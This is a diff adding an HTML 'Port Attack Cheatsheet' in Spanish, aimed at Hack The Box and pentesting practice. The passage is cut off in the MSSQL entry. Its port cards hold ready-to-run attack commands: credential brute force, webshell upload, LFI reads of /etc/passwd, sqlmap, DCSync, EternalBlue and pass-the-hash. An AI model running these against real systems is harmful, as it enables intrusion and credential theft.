@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Port Attack Cheatsheet — Pwned Notes</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0e17;
+      --bg2: #0f1420;
+      --bg3: #141926;
+      --card: #111827;
+      --card2: #1a2235;
+      --border: rgba(255,255,255,0.07);
+      --border2: rgba(255,255,255,0.12);
+      --green: #4ade80;
+      --green-dim: rgba(74,222,128,0.08);
+      --green-border: rgba(74,222,128,0.25);
+      --green-glow: 0 0 20px rgba(74,222,128,0.15);
+      --amber: #fbbf24;
+      --coral: #f87171;
+      --blue: #60a5fa;
+      --purple: #c084fc;
+      --text: #e2e8f0;
+      --text-dim: #94a3b8;
+      --text-faint: #4b5563;
+      --mono: 'JetBrains Mono', monospace;
+      --sans: 'Space Grotesk', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    /* ── BACKGROUND GRID ── */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(74,222,128,0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(74,222,128,0.025) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ── HEADER ── */
+    header {
+      position: relative;
+      z-index: 1;
+      border-bottom: 1px solid var(--border);
+      background: rgba(10,14,23,0.95);
+      backdrop-filter: blur(12px);
+      padding: 0 2rem;
+    }
+
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 0;
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .header-icon {
+      width: 48px;
+      height: 48px;
+      border: 1px solid var(--green-border);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--green-dim);
+      font-family: var(--mono);
+      font-size: 20px;
+      color: var(--green);
+      box-shadow: var(--green-glow);
+      flex-shrink: 0;
+    }
+
+    .header-text h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: var(--text);
+      letter-spacing: -0.02em;
+    }
+
+    .header-text p {
+      font-size: 13px;
+      color: var(--text-dim);
+      font-family: var(--mono);
+      margin-top: 2px;
+    }
+
+    .header-meta {
+      margin-left: auto;
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .meta-badge {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 4px;
+      border: 1px solid;
+    }
+
+    .meta-badge.green { color: var(--green); border-color: var(--green-border); background: var(--green-dim); }
+    .meta-badge.dim { color: var(--text-dim); border-color: var(--border2); background: rgba(255,255,255,0.03); }
+
+    /* ── MAIN LAYOUT ── */
+    main {
+      position: relative;
+      z-index: 1;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+
+    /* ── CONTROLS ── */
+    .controls {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-bottom: 1.5rem;
+    }
+
+    .search-wrap {
+      flex: 1;
+      min-width: 220px;
+      position: relative;
+    }
+
+    .search-wrap::before {
+      content: '⌕';
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-faint);
+      font-size: 16px;
+      pointer-events: none;
+    }
+
+    .search-input {
+      width: 100%;
+      padding: 9px 12px 9px 34px;
+      background: var(--bg2);
+      border: 1px solid var(--border2);
+      border-radius: 8px;
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 13px;
+      outline: none;
+      transition: border-color .2s;
+    }
+
+    .search-input:focus { border-color: var(--green); }
+    .search-input::placeholder { color: var(--text-faint); }
+
+    .filters {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .filter-btn {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 5px 12px;
+      border-radius: 6px;
+      border: 1px solid var(--border2);
+      background: transparent;
+      color: var(--text-dim);
+      cursor: pointer;
+      transition: all .15s;
+    }
+
+    .filter-btn:hover { border-color: var(--border2); background: rgba(255,255,255,0.04); }
+    .filter-btn.active-all { color: var(--green); border-color: var(--green-border); background: var(--green-dim); }
+    .filter-btn.active-win { color: var(--blue); border-color: rgba(96,165,250,.3); background: rgba(96,165,250,.08); }
+    .filter-btn.active-lin { color: var(--amber); border-color: rgba(251,191,36,.3); background: rgba(251,191,36,.08); }
+    .filter-btn.active-web { color: var(--purple); border-color: rgba(192,132,252,.3); background: rgba(192,132,252,.08); }
+    .filter-btn.active-db  { color: var(--coral); border-color: rgba(248,113,113,.3); background: rgba(248,113,113,.08); }
+
+    /* ── STATS BAR ── */
+    .stats-bar {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      margin-bottom: 1.25rem;
+    }
+
+    .stats-bar span { color: var(--green); }
+
+    /* ── GRID ── */
+    .port-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 10px;
+    }
+
+    /* ── PORT CARD ── */
+    .port-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      transition: border-color .2s, box-shadow .2s;
+    }
+
+    .port-card:hover { border-color: rgba(74,222,128,.2); }
+    .port-card.expanded { border-color: rgba(74,222,128,.3); box-shadow: 0 0 0 1px rgba(74,222,128,.1); }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .port-badge {
+      font-family: var(--mono);
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--green);
+      min-width: 64px;
+      letter-spacing: -0.03em;
+    }
+
+    .card-header-info { flex: 1 }
+
+    .card-header-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .port-name {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .port-proto {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-faint);
+    }
+
+    .port-tags {
+      display: flex;
+      gap: 4px;
+      flex-wrap: wrap;
+      margin-top: 5px;
+    }
+
+    .ptag {
+      font-family: var(--mono);
+      font-size: 10px;
+      padding: 1px 7px;
+      border-radius: 3px;
+      border: 1px solid;
+      white-space: nowrap;
+    }
+
+    .ptag-g { color: var(--green); border-color: rgba(74,222,128,.25); background: rgba(74,222,128,.08); }
+    .ptag-r { color: var(--coral); border-color: rgba(248,113,113,.25); background: rgba(248,113,113,.08); }
+    .ptag-a { color: var(--amber); border-color: rgba(251,191,36,.25); background: rgba(251,191,36,.08); }
+    .ptag-b { color: var(--blue); border-color: rgba(96,165,250,.25); background: rgba(96,165,250,.08); }
+    .ptag-p { color: var(--purple); border-color: rgba(192,132,252,.25); background: rgba(192,132,252,.08); }
+
+    .chevron {
+      font-size: 10px;
+      color: var(--text-faint);
+      transition: transform .2s;
+      flex-shrink: 0;
+    }
+
+    .port-card.expanded .chevron { transform: rotate(90deg); color: var(--green); }
+
+    /* ── CARD BODY ── */
+    .card-body {
+      display: none;
+      border-top: 1px solid var(--border);
+      padding: 16px;
+    }
+
+    .port-card.expanded .card-body { display: block; }
+
+    /* Attacks list */
+    .atk-title {
+      font-size: 11px;
+      font-family: var(--mono);
+      color: var(--text-faint);
+      text-transform: uppercase;
+      letter-spacing: .07em;
+      margin-bottom: 8px;
+    }
+
+    .atk-item {
+      display: flex;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 5px;
+      align-items: flex-start;
+    }
+
+    .atk-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--green);
+      flex-shrink: 0;
+      margin-top: 6px;
+    }
+
+    /* Code blocks */
+    .cmd-block {
+      background: rgba(0,0,0,.4);
+      border: 1px solid rgba(255,255,255,.05);
+      border-radius: 8px;
+      margin-top: 12px;
+      overflow: hidden;
+    }
+
+    .cmd-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 7px 12px;
+      border-bottom: 1px solid rgba(255,255,255,.04);
+      background: rgba(255,255,255,.02);
+    }
+
+    .cmd-dots { display: flex; gap: 5px; }
+    .cmd-dots span {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: rgba(255,255,255,.1);
+    }
+
+    .cmd-label-text {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-faint);
+      text-transform: uppercase;
+      letter-spacing: .07em;
+    }
+
+    .copy-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      border: 1px solid var(--border2);
+      background: transparent;
+      color: var(--text-faint);
+      cursor: pointer;
+      transition: all .15s;
+    }
+
+    .copy-btn:hover { color: var(--green); border-color: var(--green-border); background: var(--green-dim); }
+
+    pre {
+      padding: 12px 14px;
+      font-family: var(--mono);
+      font-size: 12px;
+      line-height: 1.8;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: var(--text);
+      overflow-x: auto;
+    }
+
+    .kw { color: var(--coral); }
+    .fl { color: var(--blue); }
+    .vl { color: var(--amber); }
+    .cm { color: #4b5563; font-style: italic; }
+    .gn { color: var(--green); }
+
+    /* Note box */
+    .note-box {
+      margin-top: 12px;
+      padding: 10px 12px;
+      background: rgba(251,191,36,.04);
+      border-left: 3px solid rgba(251,191,36,.4);
+      border-radius: 0 6px 6px 0;
+      font-size: 12px;
+      color: var(--text-dim);
+      line-height: 1.6;
+    }
+
+    .note-box strong { color: var(--amber); }
+
+    /* ── EMPTY STATE ── */
+    .empty-state {
+      grid-column: 1 / -1;
+      text-align: center;
+      padding: 4rem 2rem;
+      color: var(--text-faint);
+      font-family: var(--mono);
+      font-size: 13px;
+    }
+
+    .empty-state::before {
+      content: '// no results';
+      display: block;
+      font-size: 20px;
+      color: var(--text-faint);
+      margin-bottom: 8px;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      position: relative;
+      z-index: 1;
+      border-top: 1px solid var(--border);
+      padding: 1.5rem 2rem;
+      text-align: center;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+    }
+
+    footer a { color: var(--green); text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 640px) {
+      main { padding: 1rem; }
+      .header-inner { flex-direction: column; align-items: flex-start; gap: 1rem; }
+      .header-meta { margin-left: 0; }
+      .port-grid { grid-template-columns: 1fr; }
+      .controls { flex-direction: column; align-items: stretch; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="header-icon">⚡</div>
+    <div class="header-text">
+      <h1>Port Attack Cheatsheet</h1>
+      <p>// vectores de ataque por protocolo — HTB &amp; pentesting</p>
+    </div>
+    <div class="header-meta">
+      <span class="meta-badge green">16 puertos</span>
+      <span class="meta-badge dim">HTB ready</span>
+      <span class="meta-badge dim">v1.0</span>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="controls">
+    <div class="search-wrap">
+      <input type="text" class="search-input" placeholder="Buscar puerto, servicio o técnica..." oninput="doSearch(this.value)">
+    </div>
+    <div class="filters">
+      <button class="filter-btn active-all" data-cat="all" onclick="doFilter('all',this)">Todos</button>
+      <button class="filter-btn" data-cat="win" onclick="doFilter('win',this)">Windows</button>
+      <button class="filter-btn" data-cat="lin" onclick="doFilter('lin',this)">Linux</button>
+      <button class="filter-btn" data-cat="web" onclick="doFilter('web',this)">Web</button>
+      <button class="filter-btn" data-cat="db"  onclick="doFilter('db',this)">DB</button>
+    </div>
+  </div>
+
+  <div class="stats-bar" id="stats">Mostrando <span id="count">16</span> puertos</div>
+
+  <div class="port-grid" id="grid"></div>
+</main>
+
+<footer>
+  <p>Pwned Notes · <a href="index.html">← volver al índice</a> · Referencias: <a href="https://book.hacktricks.xyz" target="_blank">HackTricks</a> · <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a></p>
+</footer>
+
+<script>
+const PORTS = [
+  {
+    port: '21', proto: 'TCP', name: 'FTP',
+    cats: ['lin','win'],
+    tags: [{t:'Anon login',c:'g'},{t:'Brute force',c:'r'},{t:'Upload shell',c:'r'}],
+    attacks: [
+      'Login anónimo sin credenciales (user: anonymous)',
+      'Brute force de credenciales con Hydra',
+      'Upload de webshell si el directorio raíz sirve web'
+    ],
+    cmds: [
+      {
+        label: 'Reconocimiento',
+        raw: `nmap --script ftp-anon,ftp-bounce -p 21 <IP>\nftp <IP>                       # user: anonymous / pass: ""`,
+        html: `nmap <span class="fl">--script</span> <span class="vl">ftp-anon,ftp-bounce</span> <span class="fl">-p</span> <span class="vl">21</span> &lt;IP&gt;\nftp &lt;IP&gt;                       <span class="cm"># user: anonymous / pass: ""</span>`
+      },
+      {
+        label: 'Brute force',
+        raw: `hydra -l admin -P rockyou.txt ftp://<IP>`,
+        html: `hydra <span class="fl">-l</span> <span class="vl">admin</span> <span class="fl">-P</span> rockyou.txt ftp://&lt;IP&gt;`
+      },
+      {
+        label: 'Upload webshell (si sirve HTTP)',
+        raw: `ftp> put shell.php\n# luego: http://<IP>/shell.php`,
+        html: `ftp&gt; put shell.php\n<span class="cm"># luego: http://&lt;IP&gt;/shell.php</span>`
+      }
+    ],
+    note: 'Comprobar si el directorio raíz de FTP coincide con /var/www/html → subir .php = RCE directo.'
+  },
+  {
+    port: '22', proto: 'TCP', name: 'SSH',
+    cats: ['lin','win'],
+    tags: [{t:'Brute force',c:'r'},{t:'Private key',c:'a'},{t:'User enum',c:'b'}],
+    attacks: [
+      'Brute force de credenciales con Hydra o Medusa',
+      'Reutilización de clave privada encontrada en el sistema',
+      'Crackear passphrase de id_rsa con john/ssh2john'
+    ],
+    cmds: [
+      {
+        label: 'Brute force',
+        raw: `hydra -l root -P rockyou.txt ssh://<IP> -t 4\nmedusa -h <IP> -u root -P rockyou.txt -M ssh`,
+        html: `hydra <span class="fl">-l</span> <span class="vl">root</span> <span class="fl">-P</span> rockyou.txt ssh://&lt;IP&gt; <span class="fl">-t</span> <span class="vl">4</span>\nmedusa <span class="fl">-h</span> &lt;IP&gt; <span class="fl">-u</span> <span class="vl">root</span> <span class="fl">-P</span> rockyou.txt <span class="fl">-M</span> ssh`
+      },
+      {
+        label: 'Conexión con clave privada',
+        raw: `chmod 600 id_rsa\nssh -i id_rsa usuario@<IP>`,
+        html: `chmod 600 id_rsa\nssh <span class="fl">-i</span> id_rsa usuario@&lt;IP&gt;`
+      },
+      {
+        label: 'Crackear passphrase',
+        raw: `ssh2john id_rsa > hash.txt\njohn hash.txt --wordlist=rockyou.txt`,
+        html: `ssh2john id_rsa &gt; hash.txt\njohn hash.txt <span class="fl">--wordlist=</span>rockyou.txt`
+      }
+    ],
+    note: 'Si encuentras id_rsa en el sistema → chmod 600 + ssh -i. Con passphrase → ssh2john para crackear.'
+  },
+  {
+    port: '23', proto: 'TCP', name: 'Telnet',
+    cats: ['lin','win'],
+    tags: [{t:'Cleartext',c:'r'},{t:'Brute force',c:'r'}],
+    attacks: [
+      'Tráfico en claro — capturable con Wireshark/tcpdump (MitM)',
+      'Brute force de credenciales',
+      'Banner grabbing para identificar versión del sistema'
+    ],
+    cmds: [
+      {
+        label: 'Conexión y banner',
+        raw: `telnet <IP> 23\nnc -nv <IP> 23`,
+        html: `telnet &lt;IP&gt; 23\nnc <span class="fl">-nv</span> &lt;IP&gt; 23`
+      },
+      {
+        label: 'Brute force',
+        raw: `hydra -l admin -P rockyou.txt telnet://<IP>`,
+        html: `hydra <span class="fl">-l</span> <span class="vl">admin</span> <span class="fl">-P</span> rockyou.txt telnet://&lt;IP&gt;`
+      }
+    ],
+    note: 'Todo viaja en cleartext. Si hay acceso a la red, capturar con Wireshark para obtener credenciales.'
+  },
+  {
+    port: '25', proto: 'TCP', name: 'SMTP',
+    cats: ['lin'],
+    tags: [{t:'User enum',c:'b'},{t:'Open relay',c:'r'}],
+    attacks: [
+      'Enumeración de usuarios válidos con VRFY / RCPT TO',
+      'Open relay para enviar emails como cualquier usuario',
+      'smtp-user-enum para automatizar la enumeración'
+    ],
+    cmds: [
+      {
+        label: 'Enumeración manual',
+        raw: `nc -nv <IP> 25\nVRFY root\nVRFY admin\nEXPN staff`,
+        html: `nc <span class="fl">-nv</span> &lt;IP&gt; 25\n<span class="gn">VRFY</span> root\n<span class="gn">VRFY</span> admin\n<span class="gn">EXPN</span> staff`
+      },
+      {
+        label: 'smtp-user-enum automático',
+        raw: `smtp-user-enum -M VRFY -U users.txt -t <IP>\nsmtp-user-enum -M RCPT -U users.txt -t <IP>`,
+        html: `smtp-user-enum <span class="fl">-M</span> VRFY <span class="fl">-U</span> users.txt <span class="fl">-t</span> &lt;IP&gt;\nsmtp-user-enum <span class="fl">-M</span> RCPT <span class="fl">-U</span> users.txt <span class="fl">-t</span> &lt;IP&gt;`
+      },
+      {
+        label: 'Nmap scripts',
+        raw: `nmap --script smtp-enum-users,smtp-open-relay -p 25 <IP>`,
+        html: `nmap <span class="fl">--script</span> <span class="vl">smtp-enum-users,smtp-open-relay</span> <span class="fl">-p</span> <span class="vl">25</span> &lt;IP&gt;`
+      }
+    ],
+    note: 'VRFY devuelve si el usuario existe. RCPT TO también funciona en algunos servidores sin autenticación.'
+  },
+  {
+    port: '53', proto: 'TCP/UDP', name: 'DNS',
+    cats: ['lin','win'],
+    tags: [{t:'Zone Transfer',c:'r'},{t:'Subdomain enum',c:'b'}],
+    attacks: [
+      'Zone Transfer (AXFR) — obtener todos los registros del dominio',
+      'Enumeración de subdominios por fuerza bruta',
+      'Reverse DNS lookup para mapear la red interna'
+    ],
+    cmds: [
+      {
+        label: 'Zone Transfer (AXFR)',
+        raw: `dig axfr @<IP> dominio.htb\nhost -l dominio.htb <IP>`,
+        html: `dig axfr <span class="vl">@&lt;IP&gt;</span> dominio.htb\nhost <span class="fl">-l</span> dominio.htb &lt;IP&gt;`
+      },
+      {
+        label: 'Enumeración de subdominios',
+        raw: `gobuster dns -d dominio.htb -w subdomains-top1million-5000.txt\nffuf -u http://FUZZ.dominio.htb -w subdomains.txt -H "Host: FUZZ.dominio.htb"`,
+        html: `gobuster dns <span class="fl">-d</span> dominio.htb <span class="fl">-w</span> subdomains-top1million-5000.txt\nffuf <span class="fl">-u</span> <span class="vl">http://FUZZ.dominio.htb</span> <span class="fl">-w</span> subdomains.txt <span class="fl">-H</span> <span class="vl">"Host: FUZZ.dominio.htb"</span>`
+      },
+      {
+        label: 'Consultas adicionales',
+        raw: `dig @<IP> dominio.htb ANY\ndig @<IP> -x <IP_victima>`,
+        html: `dig <span class="vl">@&lt;IP&gt;</span> dominio.htb ANY\ndig <span class="vl">@&lt;IP&gt;</span> -x &lt;IP_victima&gt;`
+      }
+    ],
+    note: 'Si el servidor DNS responde al AXFR → jackpot. Revela toda la infraestructura interna del dominio.'
+  },
+  {
+    port: '80 / 443', proto: 'TCP', name: 'HTTP / HTTPS',
+    cats: ['web'],
+    tags: [{t:'Dir enum',c:'p'},{t:'SQLi',c:'r'},{t:'LFI/RFI',c:'r'},{t:'Upload',c:'a'}],
+    attacks: [
+      'Fuzzing de directorios, extensiones y virtual hosts',
+      'SQL Injection en formularios y parámetros GET/POST',
+      'LFI / Path Traversal en parámetros de fichero',
+      'File upload bypass para subir webshell'
+    ],
+    cmds: [
+      {
+        label: 'Reconocimiento inicial',
+        raw: `whatweb http://<IP>\ncurl -I http://<IP>\nnikto -h http://<IP>`,
+        html: `whatweb http://&lt;IP&gt;\ncurl <span class="fl">-I</span> http://&lt;IP&gt;\nnikto <span class="fl">-h</span> http://&lt;IP&gt;`
+      },
+      {
+        label: 'Fuzzing dirs y vhosts',
+        raw: `gobuster dir -u http://<IP> -w directory-list-2.3-medium.txt -x php,html,txt\nffuf -u http://FUZZ.dominio.htb -w subdomains.txt -H "Host: FUZZ.dominio.htb"`,
+        html: `gobuster dir <span class="fl">-u</span> http://&lt;IP&gt; <span class="fl">-w</span> directory-list-2.3-medium.txt <span class="fl">-x</span> php,html,txt\nffuf <span class="fl">-u</span> <span class="vl">http://FUZZ.dominio.htb</span> <span class="fl">-w</span> subdomains.txt <span class="fl">-H</span> <span class="vl">"Host: FUZZ.dominio.htb"</span>`
+      },
+      {
+        label: 'LFI básico',
+        raw: `curl http://<IP>/page.php?file=../../../../etc/passwd\ncurl http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php`,
+        html: `curl http://&lt;IP&gt;/page.php?file=<span class="vl">../../../../etc/passwd</span>\ncurl http://&lt;IP&gt;/page.php?file=<span class="vl">php://filter/convert.base64-encode/resource=index.php</span>`
+      },
+      {
+        label: 'SQLi con sqlmap',
+        raw: `sqlmap -u "http://<IP>/page.php?id=1" --dbs\nsqlmap -u "http://<IP>/login" --data="user=admin&pass=test" --dbs`,
+        html: `sqlmap <span class="fl">-u</span> <span class="vl">"http://&lt;IP&gt;/page.php?id=1"</span> <span class="fl">--dbs</span>\nsqlmap <span class="fl">-u</span> <span class="vl">"http://&lt;IP&gt;/login"</span> <span class="fl">--data=</span><span class="vl">"user=admin&amp;pass=test"</span> <span class="fl">--dbs</span>`
+      }
+    ],
+    note: 'Revisar código fuente, cookies, headers y robots.txt antes de lanzar herramientas. La pista suele estar ahí.'
+  },
+  {
+    port: '110 / 995', proto: 'TCP', name: 'POP3',
+    cats: ['lin'],
+    tags: [{t:'Brute force',c:'r'},{t:'Email dump',c:'b'}],
+    attacks: [
+      'Brute force de credenciales de correo',
+      'Lectura manual de emails en texto claro',
+      'Extracción de credenciales o tokens en buzones'
+    ],
+    cmds: [
+      {
+        label: 'Conexión manual',
+        raw: `nc -nv <IP> 110\nUSER admin\nPASS admin\nLIST\nRETR 1`,
+        html: `nc <span class="fl">-nv</span> &lt;IP&gt; 110\n<span class="gn">USER</span> admin\n<span class="gn">PASS</span> admin\n<span class="gn">LIST</span>          <span class="cm"># listar emails</span>\n<span class="gn">RETR</span> 1        <span class="cm"># leer email 1</span>`
+      },
+      {
+        label: 'Brute force',
+        raw: `hydra -l admin -P rockyou.txt pop3://<IP>`,
+        html: `hydra <span class="fl">-l</span> <span class="vl">admin</span> <span class="fl">-P</span> rockyou.txt pop3://&lt;IP&gt;`
+      }
+    ],
+    note: 'Los emails pueden contener credenciales, tokens de reset o información de otros servicios internos.'
+  },
+  {
+    port: '135', proto: 'TCP', name: 'RPC / MSRPC',
+    cats: ['win'],
+    tags: [{t:'Null session',c:'g'},{t:'RID brute',c:'b'},{t:'DCSync',c:'r'}],
+    attacks: [
+      'Null session → enumerar usuarios y grupos del dominio',
+      'RID brute force para descubrir usuarios sin credenciales',
+      'DCSync si hay permisos de replicación (interfaz DRSUAPI)'
+    ],
+    cmds: [
+      {
+        label: 'Mapear endpoints',
+        raw: `impacket-rpcdump @<IP>\nimpacket-rpcdump -p 445 <IP>   # via SMB`,
+        html: `impacket-rpcdump @&lt;IP&gt;\nimpacket-rpcdump <span class="fl">-p 445</span> &lt;IP&gt;   <span class="cm"># via SMB</span>`
+      },
+      {
+        label: 'Null session + enumeración',
+        raw: `rpcclient -U "" -N <IP>\nenumdomusers\nquerydispinfo\nnetshareenumall`,
+        html: `rpcclient <span class="fl">-U ""</span> <span class="fl">-N</span> &lt;IP&gt;\n<span class="gn">enumdomusers</span>\n<span class="gn">querydispinfo</span>\n<span class="gn">netshareenumall</span>`
+      },
+      {
+        label: 'RID Brute Force',
+        raw: `impacket-lookupsid anonymous@<IP>\n\n# o manual:\nfor i in $(seq 500 1100); do\n  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"\ndone`,
+        html: `impacket-lookupsid anonymous@&lt;IP&gt;\n\n<span class="cm"># o manual:</span>\n<span class="kw">for</span> i in $(seq 500 1100); <span class="kw">do</span>\n  rpcclient <span class="fl">-N -U ""</span> &lt;IP&gt; <span class="fl">-c</span> <span class="vl">"queryuser 0x$(printf '%x' $i)"</span> 2&gt;/dev/null | grep <span class="vl">"User Name"</span>\n<span class="kw">done</span>`
+      },
+      {
+        label: 'DCSync (con credenciales)',
+        raw: `impacket-secretsdump -just-dc 'DOMAIN/admin:pass'@<DC_IP>`,
+        html: `impacket-secretsdump <span class="fl">-just-dc</span> <span class="vl">'DOMAIN/admin:pass'</span>@&lt;DC_IP&gt;`
+      }
+    ],
+    note: 'Si rpcdump muestra DRSUAPI → el host es un DC. Con permisos suficientes → DCSync para obtener todos los hashes.'
+  },
+  {
+    port: '139 / 445', proto: 'TCP', name: 'SMB',
+    cats: ['win'],
+    tags: [{t:'Null session',c:'g'},{t:'EternalBlue',c:'r'},{t:'Pass-the-Hash',c:'r'}],
+    attacks: [
+      'Null session para listar shares sin credenciales',
+      'EternalBlue (MS17-010) en sistemas sin parchear',
+      'Pass-the-Hash con hash NTLM capturado',
+      'NTLM Relay hacia otros servicios'
+    ],
+    cmds: [
+      {
+        label: 'Enumeración inicial',
+        raw: `nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>\nenum4linux-ng -A <IP>\ncrackmapexec smb <IP>`,
+        html: `nmap <span class="fl">--script</span> <span class="vl">smb-enum-shares,smb-enum-users</span> <span class="fl">-p</span> <span class="vl">445</span> &lt;IP&gt;\nenum4linux-ng <span class="fl">-A</span> &lt;IP&gt;\ncrackmapexec smb &lt;IP&gt;`
+      },
+      {
+        label: 'Acceso a shares',
+        raw: `smbclient -L //<IP> -N\nsmbmap -H <IP>\nsmbclient //<IP>/share -U usuario`,
+        html: `smbclient <span class="fl">-L</span> //&lt;IP&gt; <span class="fl">-N</span>             <span class="cm"># null session</span>\nsmbmap <span class="fl">-H</span> &lt;IP&gt;\nsmbclient //&lt;IP&gt;/share <span class="fl">-U</span> <span class="vl">usuario</span>`
+      },
+      {
+        label: 'EternalBlue (MS17-010)',
+        raw: `nmap --script smb-vuln-ms17-010 -p 445 <IP>\n# si vulnerable:\nuse exploit/windows/smb/ms17_010_eternalblue`,
+        html: `nmap <span class="fl">--script</span> <span class="vl">smb-vuln-ms17-010</span> <span class="fl">-p</span> <span class="vl">445</span> &lt;IP&gt;\n<span class="cm"># si es vulnerable:</span>\nuse exploit/windows/smb/ms17_010_eternalblue`
+      },
+      {
+        label: 'Pass-the-Hash',
+        raw: `crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>\nimpacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>`,
+        html: `crackmapexec smb &lt;IP&gt; <span class="fl">-u</span> <span class="vl">Administrator</span> <span class="fl">-H</span> <span class="vl">&lt;NTLM_HASH&gt;</span>\nimpacket-psexec <span class="fl">-hashes</span> <span class="vl">:&lt;NTLM_HASH&gt;</span> Administrator@&lt;IP&gt;`
+      }
+    ],
+    note: 'Siempre comprobar MS17-010 en Windows 7/2008 R2. Pass-the-Hash funciona si tienes el hash NTLM del admin local.'
+  },
+  {
+    port: '389 / 636', proto: 'TCP', name: 'LDAP',
+    cats: ['win'],
+    tags: [{t:'Anonymous bind',c:'g'},{t:'Kerberoasting',c:'r'},{t:'ASREPRoast',c:'r'}],
+    attacks: [
+      'Anonymous bind para enumerar objetos de Active Directory',
+      'Kerberoasting — solicitar tickets de cuentas con SPN',
+      'ASREPRoasting — cuentas sin pre-autenticación Kerberos'
+    ],
+    cmds: [
+      {
+        label: 'Anonymous bind',
+        raw: `ldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=htb"\nldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=htb" "(objectClass=user)" sAMAccountName`,
+        html: `ldapsearch <span class="fl">-x -H</span> ldap://&lt;IP&gt; <span class="fl">-b</span> <span class="vl">"DC=dominio,DC=htb"</span>\nldapsearch <span class="fl">-x -H</span> ldap://&lt;IP&gt; <span class="fl">-b</span> <span class="vl">"DC=dominio,DC=htb"</span> <span class="vl">"(objectClass=user)"</span> sAMAccountName`
+      },
+      {
+        label: 'Kerberoasting',
+        raw: `impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <IP> -request\nhashcat -m 13100 hashes.txt rockyou.txt`,
+        html: `impacket-GetUserSPNs <span class="vl">'DOMAIN/user:pass'</span> <span class="fl">-dc-ip</span> &lt;IP&gt; <span class="fl">-request</span>\nhashcat <span class="fl">-m</span> <span class="vl">13100</span> hashes.txt rockyou.txt`
+      },
+      {
+        label: 'ASREPRoasting',
+        raw: `impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -dc-ip <IP>\nhashcat -m 18200 hashes.txt rockyou.txt`,
+        html: `impacket-GetNPUsers <span class="vl">'DOMAIN/'</span> <span class="fl">-usersfile</span> users.txt <span class="fl">-dc-ip</span> &lt;IP&gt;\nhashcat <span class="fl">-m</span> <span class="vl">18200</span> hashes.txt rockyou.txt`
+      }
+    ],
+    note: 'BloodHound para mapear rutas de escalada en AD: SharpHound recopila datos → BloodHound visualiza paths.'
+  },
+  {
+    port: '1433', proto: 'TCP', name: 'MSSQL',
+    cats: ['db','win'],
+    tags: [{t:'xp_cmdshell',c:'r'},{t:'Brute force',c:'r'},{t:'RCE',c:'r'}],
+    attacks: [
+      'xp_cmdshell para ejecutar comandos del sistema operativo',
+      'Brute force de credenciales del usuario SA',
+      'Linked servers para pivoting a otros hosts'
+    ],
+    cmds: [
+      {
+        label: 'Conexión y enumeración',
